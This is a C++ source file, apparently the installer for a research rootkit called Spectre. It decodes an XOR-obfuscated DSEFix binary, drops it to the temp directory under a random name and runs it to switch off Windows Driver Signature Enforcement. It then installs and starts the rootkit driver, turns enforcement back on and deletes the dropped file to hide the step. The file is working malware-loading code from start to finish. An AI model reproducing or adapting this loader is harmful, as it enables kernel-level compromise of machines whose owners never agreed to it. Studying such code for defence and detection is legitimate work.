/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "common.h"
#include "DriverServiceInstaller.h"
#include "SpectreDriver.h"
#include <filesystem>
#include <random>
#include <stdio.h>
#include <codecvt>

#pragma warning(disable : 4996)

std::string random_string(int len)
{
	std::string str("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");

	std::random_device rd;
	std::mt19937 generator(rd());

	std::shuffle(str.begin(), str.end(), generator);

	return str.substr(0, len);    // assumes 32 < number of characters in str         
}

std::string RunBinary(byte* binary_array, size_t size, LPWSTR argv, std::string *path) {
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> strconverter;
	std::ofstream binaryFile;
	std::wstring binaryFullPath;
	BOOL existingFile;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	existingFile = binary_array == NULL || path;

	if (existingFile) {
		binaryFullPath = strconverter.from_bytes(*path);
	}
	else {
		std::wstring tempFullPath;
		std::string binaryName;

		binaryName = random_string(12);
		tempFullPath = std::filesystem::temp_directory_path().wstring();
		binaryFullPath = tempFullPath + L"\\" + strconverter.from_bytes(binaryName) + L".exe";

		//
		// Write the binary to the disk.
		//
		DBGPRINT("main: Writing binary file to temp.");

		binaryFile.open(binaryFullPath, std::ios::binary);
		binaryFile.write(RCAST<CONST CHAR*>(binary_array), size);
		binaryFile.close();
	}

	//
	// Prepare the binary to be launched
	//
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.hStdOutput = NULL;
	si.hStdError = NULL;

	ZeroMemory(&pi, sizeof(pi));

	//
	// Start the binary
	// 
	CreateProcess(binaryFullPath.c_str(),   // the path
		argv,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
	);


	//
	// Waiting for the program to finish
	//
	WaitForSingleObject(pi.hProcess, 5000);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	//
	// Return the path where the binary is located
	//
	return strconverter.to_bytes(binaryFullPath);
}

int main()
{
	BOOLEAN success;
	DriverServiceInstaller spectreInstaller;
	ULONG i;

	//
	// Deobfuscate the dsefix buffer.
	//
	for (i = 0; i < sizeof(dse_fix); i++)
	{
		dse_fix[i] ^= SPECTRE_XOR_KEY;
	}
	DBGPRINT("main: Deobfuscated the DSEFix binary.");

	std::string binaryPath = RunBinary(dse_fix, sizeof(dse_fix), NULL, NULL);

	DBGPRINT("main: Disabled Driver Signature Enforcement");

	//
	// Deobfuscate the driver buffer.
	//
	for (i = 0; i < sizeof(spectre_driver); i++)
	{
		spectre_driver[i] ^= SPECTRE_XOR_KEY;
	}
	DBGPRINT("main: Deobfuscated the Spectre Rootkit driver.");

	//
	// Install the driver.
	//
	success = spectreInstaller.InstallDriver(spectre_driver, sizeof(spectre_driver));
	if (success == FALSE)
	{
		DBGPRINT("main: Failed to install the Spectre Rootkit driver.");
		return FALSE;
	}

	DBGPRINT("main: Installed the Spectre Rootkit driver.");

	//
	// Start the driver.
	//
	success = spectreInstaller.StartDriver();
	if (success == FALSE)
	{
		DBGPRINT("main: Failed to start the Spectre Rootkit driver.");
		return FALSE;
	}

	DBGPRINT("main: Started the Spectre Rootkit driver.");

	//
	// Re-enable DSE with the flag "-e"
	//
	const char* argv_cstr = "-e";
	wchar_t argv[20];
	mbstowcs(argv, argv_cstr, strlen(argv_cstr) + 1);//Plus null
	LPWSTR ptr = argv;

	RunBinary(dse_fix, sizeof(dse_fix), argv, &binaryPath);

	DBGPRINT("main: Re-enabled Driver Signature Enforcement");


	//
	// Delete the binary from the file system
	//

	remove(binaryPath.c_str());


	DBGPRINT("main: Deleted binary file from temp.");

	return TRUE;
}
